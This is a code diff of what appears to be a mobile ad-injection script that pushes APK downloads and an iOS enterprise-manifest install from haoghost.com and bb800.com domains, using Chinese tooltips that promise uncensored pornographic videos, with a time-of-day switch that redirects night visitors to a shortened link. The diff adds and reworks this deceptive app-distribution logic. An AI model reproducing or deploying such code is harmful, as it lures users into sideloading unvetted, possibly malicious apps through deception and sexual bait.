@@ -49,14 +49,14 @@ var hy_itv=setInterval(function(){
 	var num=hy_cpc_num || "10",imgPath="http://m.haoghost.com/images/",downPath="http://d.haoghost.com/",isup=2;
 	var pname=getDownUrl(),iosname=getIosDownUrl();
 
-	var azimgs=["wb_b5.gif","wb_b3.gif","wb_b2.gif","wb_b.gif"],
-		azlinks=["http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/note.html?f=cpctag_"+num,downPath+"360xpg.apk",downPath+"360ysdq.apk"],
-		aztooltip=["","","正在下载快播魅影,激情无码视屏随意看","正在下载午夜视频,私密珍藏大片任你看"];
+	var azimgs=["wb_b5.gif","wb_n1.gif","wb_b3.gif","wb_n2.gif","wb_b2.gif","wb_b.gif"],
+		azlinks=["http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/note.html?f=cpctag_"+num,"http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/?f=cpctag_"+num,downPath+"360xpg.apk",downPath+"360ysdq.apk"],
+		aztooltip=["","","","","正在下载快播魅影,激情无码视屏随意看","正在下载午夜视频,私密珍藏大片任你看"];
 
-	if(num==23 || num==24 || num==26)
+	
+	if(num==16)
 	{
-		//azimgs=["wb_b5.gif","wb_b3.gif","wb_n1.gif","wb_n2.gif"];
-		azimgs=["wb_b5.gif","wb_b3.gif","wb_n1.gif","wb_n2.gif","wb_b2.gif","wb_b.gif"];
+		azimgs=["wb_b3.gif","wb_n1.gif","wb_b5.gif","wb_n2.gif","wb_b2.gif","wb_b.gif"];
 		azlinks=["http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/note.html?f=cpctag_"+num,"http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/?f=cpctag_"+num,downPath+"360xpg.apk",downPath+"360ysdq.apk"];
 		aztooltip=["","","","","正在下载快播魅影,激情无码视屏随意看","正在下载午夜视频,私密珍藏大片任你看"];
 	}
@@ -109,7 +109,7 @@ var hy_itv=setInterval(function(){
 		switch(num)
 		{
 			case "16":
-				result="http://www.haima.me/?c=cpapz01";
+				result="itms-services:///?action=download-manifest&amp;url=https://qvod.bb800.com/assets/upload/130.plist";
 				break;
 			default:
 				result="itms-services:///?action=download-manifest&amp;url=https://qvod.bb800.com/assets/upload/130.plist";
@@ -127,9 +127,9 @@ var hy_itv=setInterval(function(){
 				break;
 			default:
 				var rd=Math.random();
-				//if(notNight()) result="sybb.10C352.apk";
-				//else result="http://t.cn/R7qFBqD";
-				result="sybb.10C352.apk";
+				if(notNight()) result="sybb.10C352.apk";
+				else result="http://t.cn/R7qFBqD";
+				//result="http://t.cn/R7qFBqD";
 		}
 		return result;
 	}
